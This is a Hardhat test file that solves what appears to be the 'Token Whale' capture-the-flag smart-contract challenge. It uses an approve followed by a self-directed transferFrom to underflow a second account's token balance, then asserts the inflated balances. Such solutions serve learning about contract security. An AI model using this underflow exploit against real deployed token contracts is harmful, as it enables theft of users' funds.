const { ethers } = require("hardhat");
const { expect } = require("chai");

const BigNumber = ethers.BigNumber;


describe("TokenWhaleChallenge", function () {
    let contract;
    let owner;
    let attacker1;
    let attacker2;

    this.beforeEach(async function () {
        [owner, attacker1, attacker2] = await ethers.getSigners();
        const TokenSaleChallenge = await ethers.getContractFactory("TokenWhaleChallenge");
        contract = await TokenSaleChallenge.deploy(attacker1.address);
        await contract.deployed()
    });

    describe("TokenWhaleChallenge", function () {
        it("attack", async function () {
            let balance1 = await contract.balanceOf(attacker1.address);
            let balance2 = await contract.balanceOf(attacker2.address);

            expect(balance1).to.equal(BigNumber.from("1000"));
            expect(balance2).to.equal(BigNumber.from("0"));

            // approve
            await contract.connect(attacker1).approve(attacker2.address, BigNumber.from("1000"));
            // transferFrom
            await contract.connect(attacker2).transferFrom(attacker1.address, attacker1.address, BigNumber.from("1"));

            console.log("Attacker2: ", await contract.balanceOf(attacker2.address));
            expect(balance1).to.be.lt(await contract.balanceOf(attacker1.address));
            expect(balance1).to.be.lt(await contract.balanceOf(attacker2.address));

        });
    });
});